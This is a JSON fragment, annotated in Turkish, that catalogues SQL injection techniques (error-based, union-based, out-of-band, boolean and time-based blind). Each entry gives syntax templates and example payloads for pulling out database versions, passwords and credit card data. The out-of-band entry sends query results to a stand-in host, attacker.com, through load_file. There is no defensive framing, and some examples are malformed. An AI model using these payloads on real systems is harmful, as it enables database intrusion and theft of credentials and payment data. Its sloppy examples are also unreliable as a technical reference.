  "error_based_sql": {
    "desc": "Hata mesajları üzerinden veri çıkarma yöntemi",
    "syntax": "SELECT * FROM table WHERE column = 'value' AND extractvalue(rand(),concat(0x3a,(SELECT query)));",
    "example": "SELECT * FROM users WHERE id = 1' AND extractvalue(rand(),concat(0x3a,(SELECT @@version)));",
    "category": "SQL Injection",
    "type": "Error Based",
    "risk": "High",
    "purpose": "Veritabanı versiyonu ve sistem bilgilerini çıkarma"
  },
  "union_based_sql": {
    "desc": "UNION komutu ile farklı tablolardan veri çıkarma",
    "syntax": "SELECT columns FROM table1 UNION SELECT columns FROM table2;",
    "example": "SELECT username, password FROM users WHERE id = 1 UNION SELECT credit_card, pin FROM customers;",
    "category": "SQL Injection",
    "type": "Union Based",
    "risk": "Critical",
    "purpose": "Birden fazla tablodan veri çıkarma"
  },
  "out_of_band_sql": {
    "desc": "DNS veya HTTP gibi farklı kanallardan veri sızdırma yöntemi",
    "syntax": "SELECT load_file(concat('\\\\\\\\', (SELECT query), '.attacker.com\\\\abc'));",
    "example": "SELECT load_file(concat('\\\\\\\\', (SELECT @@version), '.attacker.com\\\\abc'));",
    "category": "SQL Injection",
    "type": "Out of Band",
    "risk": "High",
    "purpose": "Alternatif kanallardan veri exfiltration"
  },
  "boolean_based_sql": {
    "desc": "Sorgu sonucunun doğru/yanlış olmasına göre veri çıkarma",
    "syntax": "SELECT * FROM table WHERE condition AND substring(column,position,length) = 'character';",
    "example": "SELECT * FROM users WHERE username = 'admin' AND substring(password,1,1) = 'a';",
    "category": "SQL Injection",
    "type": "Boolean Based",
    "risk": "Medium",
    "purpose": "Blind SQL injection ile veri tahmin etme"
  },
  "time_based_sql": {
    "desc": "Zaman gecikmesi ile blind SQL injection gerçekleştirme",
    "syntax": "SELECT * FROM table WHERE condition AND IF(condition, sleep(seconds), false);",
    "examples": [
      "SELECT * FROM users WHERE username = 'admin' AND IF(1=1, sleep(10), false);",
      "SELECT * FROM users WHERE username = 'admin' AND IF(substring(password,1,1) = 'a', sleep(10), false);"
    ],
    "category": "SQL Injection",
    "type": "Time Based",
    "risk": "Medium",
    "purpose": "Zaman tabanlı blind SQL injection"
  },
